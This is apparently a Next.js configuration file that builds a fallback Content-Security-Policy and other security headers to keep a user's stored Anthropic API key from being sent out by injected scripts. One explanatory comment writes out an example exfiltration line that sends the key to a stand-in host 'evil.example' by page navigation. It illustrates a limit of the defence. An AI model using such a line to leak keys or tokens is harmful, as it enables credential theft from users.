import type { NextConfig } from "next";

/**
 * A Content-Security-Policy, written for one threat in particular.
 *
 * The AI assistant takes the visitor's own Anthropic key and keeps it in `sessionStorage` (see
 * `src/lib/byok.ts` for why it is there and not on our server). The honest objection to that — the
 * one a reader raised — is that **any script running in this page can read it**. A compromised
 * dependency is the realistic way that happens; nobody needs to break into the host.
 *
 * So the policy is aimed at the step *after* the theft: getting the key out. `connect-src` names
 * the only three places this app ever talks to, so an injected script cannot `fetch` a stolen key
 * to an attacker's server, and `form-action` stops it being posted through a form.
 *
 * **This header is now the fallback.** The policy the browser actually gets is minted per request
 * in `src/proxy.ts`, with a nonce, and that one has no `'unsafe-inline'` in `script-src`. What is
 * written here cannot: a header configured at build time is one string for every request, and a
 * nonce that is the same every time is not a nonce. It stays for anything the proxy's matcher does
 * not cover, and so that a deployment which drops the proxy is left with a policy rather than none.
 *
 * **What neither version does**, stated plainly rather than left for someone to discover: CSP
 * cannot stop a top-level navigation (`location = "https://evil.example/?k=" + key`). `navigate-to`
 * was removed from the spec and never shipped. The exits are narrowed; that is not the same as
 * XSS being fixed, and the README says so in the same words.
 */
/**
 * Where crash reports may be posted, when a deployment has chosen somewhere.
 *
 * In `connect-src` for the same reason Supabase is: the policy names every origin this page may
 * talk to, so an endpoint that is configured but not listed would be blocked — and a crash
 * reporter silently refused by the CSP is worse than none, because the operator believes they have
 * one.
 */
const REPORT_ORIGIN = (() => {
  try {
    const url = process.env.NEXT_PUBLIC_ERROR_REPORT_URL?.trim();
    return url ? new URL(url).origin : "";
  } catch {
    return "";
  }
})();

const SUPABASE_ORIGIN = (() => {
  // Only present when someone has attached their own Supabase project; the default deployment has
  // no cloud backend, and then the origin must not be in the policy at all.
  try {
    const url = process.env.NEXT_PUBLIC_SUPABASE_URL?.trim();
    return url ? new URL(url).origin : "";
  } catch {
    return "";
  }
})();

const csp = [
  "default-src 'self'",
  // Weak, and only ever reached when the proxy's header is not. See the note above.
  "script-src 'self' 'unsafe-inline'",
  // Tailwind ships a stylesheet, but React writes `style` attributes for chart geometry and the
  // crash screen, which is what 'unsafe-inline' covers here.
  "style-src 'self' 'unsafe-inline'",
  // `blob:` for charts rendered through a canvas, `data:` for the images that go into a PDF.
  "img-src 'self' data: blob:",
  "font-src 'self' data:",
  // The whole point. `api.anthropic.com` is the BYOK path; the Supabase origin appears only on a
  // deployment that configured one; everything else this app fetches is its own routes.
  ["connect-src 'self' https://api.anthropic.com", SUPABASE_ORIGIN, REPORT_ORIGIN].filter(Boolean).join(" "),
  // Downloads go through a blob: URL, which counts as a navigation.
  "object-src 'none'",
  "base-uri 'self'",
  "form-action 'self'",
  "frame-ancestors 'none'",
  "upgrade-insecure-requests",
].join("; ");

const nextConfig: NextConfig = {
  // Subresource Integrity: every emitted bundle gets a hash, and the browser refuses one that
  // does not match. It is not what removed 'unsafe-inline' — inline scripts have no file to hash,
  // which is what the attempt proved — but it is a real check on what a CDN hands out, and it
  // costs nothing at runtime.
  experimental: { sri: { algorithm: "sha384" } },
  async headers() {
    return [
      {
        source: "/:path*",
        headers: [
          // A fallback for anything the proxy does not match, and for a deployment that strips it.
          // The real policy — the one without 'unsafe-inline' — is minted per request in
          // `src/proxy.ts`; a header set here cannot carry a nonce, because it is one string for
          // every request.
          { key: "Content-Security-Policy", value: csp },
          // Not CSP, but the same job: keep what this page knows from leaving through a side door.
          { key: "Referrer-Policy", value: "strict-origin-when-cross-origin" },
          { key: "X-Content-Type-Options", value: "nosniff" },
          { key: "X-Frame-Options", value: "DENY" },
          // The app needs none of these, and a page that never asks should not be able to.
          { key: "Permissions-Policy", value: "camera=(), microphone=(), geolocation=(), payment=()" },
        ],
      },
    ];
  },
};

export default nextConfig;
